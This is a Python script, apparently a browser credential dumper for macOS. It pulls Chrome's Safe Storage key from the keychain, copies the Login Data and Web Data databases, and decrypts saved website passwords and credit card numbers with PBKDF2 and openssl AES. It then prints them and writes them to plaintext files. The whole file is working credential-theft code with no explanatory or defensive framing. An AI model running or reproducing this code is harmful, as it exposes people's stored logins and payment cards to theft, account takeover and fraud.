import os
import sys
import glob
import operator
import subprocess
import shutil
import sqlite3
import binascii
import base64
import tempfile
import hmac
from hashlib import sha1
from struct import Struct
from itertools import starmap

_pack_int = Struct('>I').pack


def pbkdf2_alg(data, salt, iterations, keylen=16, hashfunc=None):
    
    hashfunc = hashfunc or sha1
    mac = hmac.new(data, None, hashfunc)
    
    def _pseudorandom(x, mac=mac):
        h = mac.copy()
        h.update(x)
        return map(ord, h.digest())
    
    buf = []
    for block in range(1, -(-keylen // mac.digest_size) + 1):
        rv = u = _pseudorandom(salt + _pack_int(block))
        for i in range(iterations - 1):
            u = _pseudorandom(''.join(map(chr, u)))
            rv = starmap(operator.xor, zip(rv, u))
        buf.extend(rv)
    return ''.join(map(chr, buf))[:keylen]

try:
    from hashlib import pbkdf2_hmac
except ImportError:
    pbkdf2_hmac = pbkdf2_alg


def decrypt(encrypted, safe_storage_key):
    
    iv = ''.join(('20', ) * 16)
    key = pbkdf2_hmac('sha1', safe_storage_key, b'saltysalt', 1003)[:16]
    hex_key = binascii.hexlify(key)
    hex_enc_password = base64.b64encode(encrypted[3:])
    
    try:
        decrypted = subprocess.check_output(
                "openssl enc -base64 -d "
                "-aes-128-cbc -iv '{}' -K {} <<<"
                "{} 2>/dev/null".format(iv, hex_key, hex_enc_password),
                shell=True)
    except subprocess.CalledProcessError:
        decrypted = "Error decrypting th data"
    
    return decrypted


def db_query(chrome_data, content_type):
    
    # Work around for locking DB
    copy_path = tempfile.mkdtemp()
    with open(chrome_data, 'r') as content:
        dbcopy = content.read()
    with open('{}/chrome'.format(copy_path), 'w') as content:
        # if chrome is open, the DB will be locked
        # so get around this by making a temp copy
        content.write(dbcopy)
    
    database = sqlite3.connect('{}/chrome'.format(copy_path))
    
    if content_type == 'Web Data':
        sql_query = ('SELECT name_on_card, card_number_encrypted, expiration_month, '
                     'expiration_year FROM credit_cards')
        keys = ['name', 'card', 'exp_m', 'exp_y']
    else:
        sql_query = ('SELECT username_value, password_value, origin_url '
                     'FROM logins')
        keys = ['user', 'pass', 'url']
    
    db_data = []
    with database:
        for values in database.execute(sql_query):
            if not values[0] or (values[1][:3] != b'v10'):
                continue
            else:
                db_data.append(dict(zip(keys, values)))
    
    shutil.rmtree(copy_path)
    
    return db_data


def utfout(x):
    return x.encode('utf-8', errors='replace')


def extract(data, safe_storage_key):
    
    for profile in data:

        if 'Web Data' in profile:
            db_data = db_query(profile, 'Web Data')
            
            print('Credit Cards')
            
            for i, entry in enumerate(db_data):
                entry['card'] = decrypt(entry['card'], safe_storage_key)
                cc_dict = {
                    '3': 'AMEX',
                    '4': 'Visa',
                    '5': 'Mastercard',
                    '6': 'Discover'
                }
                
                brand = 'Unknown Card'
                if entry['card'][0] in cc_dict:
                    brand = cc_dict[entry['card'][0]]

                with open('credit_cards.txt', 'a') as file:
                    file.write('[{}] {}\n'.format(i + 1, brand))
                    file.write('\tCard Holder: {}\n'.format(utfout(entry['name'])))
                    file.write('\tCard Number: {}\n'.format(utfout(entry['card'])))
                    file.write('\tExpiration: {}/{}\n\n'.format(utfout(entry['exp_m']), utfout(entry['exp_y'])))
                    file.close()

                print('[{}] {}'.format(i + 1, brand))
                print('\tCard Holder: {}'.format(utfout(entry['name'])))
                print('\tCard Number: {}'.format(utfout(entry['card'])))
                print('\tExpiration: {}/{}'.format(utfout(entry['exp_m']), utfout(entry['exp_y'])))

        else:
            db_data = db_query(profile, 'Login Data')
            
            print('Passwords')
            
            for i, entry in enumerate(db_data):
                entry['pass'] = decrypt(entry['pass'], safe_storage_key)

                with open('account_passwords.txt', 'a') as file:
                    file.write('[{}] {}\n'.format(i + 1, utfout(entry['url'])))
                    file.write('\tUsername: {}\n'.format(utfout(entry['user'])))
                    file.write('\tPassword: {}\n\n'.format(utfout(entry['pass'])))
                    file.close()

                print('[{}] {}'.format(i + 1, utfout(entry['url'])))
                print('\tUsername: {}'.format(utfout(entry['user'])))
                print('\tPassword: {}'.format(utfout(entry['pass'])))


if __name__ == '__main__':
    root_path = os.path.expanduser('~') + '/Library/Application Support/Google/Chrome/Profile 3'
    login_data_path = os.path.join(root_path, 'Login Data')
    cc_data_path = os.path.join(root_path, 'Web Data')
    data = glob.glob(login_data_path) + glob.glob(cc_data_path)
    
    safe_storage_key = subprocess.Popen(
            "security find-generic-password -wa "
            "'Chrome'",
            stderr=subprocess.PIPE,
            stdout=subprocess.PIPE,
            shell=True)
    stdout, stderr = safe_storage_key.communicate()
    
    if stderr:
        print('Error: {}. Chrome entry not found in keychain.'.format(stderr))
        sys.exit()
    if not stdout:
        print('User clicked deny')
    
    safe_storage_key = stdout.replace('\n', '')
    extract(data, safe_storage_key)
